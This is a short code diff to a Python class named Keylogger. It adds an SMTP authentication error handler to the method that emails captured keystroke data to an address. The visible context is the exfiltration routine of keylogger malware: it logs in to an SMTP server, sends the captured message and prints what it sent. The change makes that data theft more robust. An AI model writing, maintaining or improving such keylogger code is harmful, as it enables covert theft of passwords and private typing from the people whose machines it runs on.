@@ -71,6 +71,8 @@ class Keylogger:
             server.sendmail(email, email, self.e_mail(message))
             server.quit()
             print(f"{datetime.now()} - Sent an email to {email} containing: {message}")
+        except smtplib.SMTPAuthenticationError as e:
+            print(f"Error authenticating to SMTP server: {e}")
         except Exception as e:
             print(f"Error sending email: {e}")
 
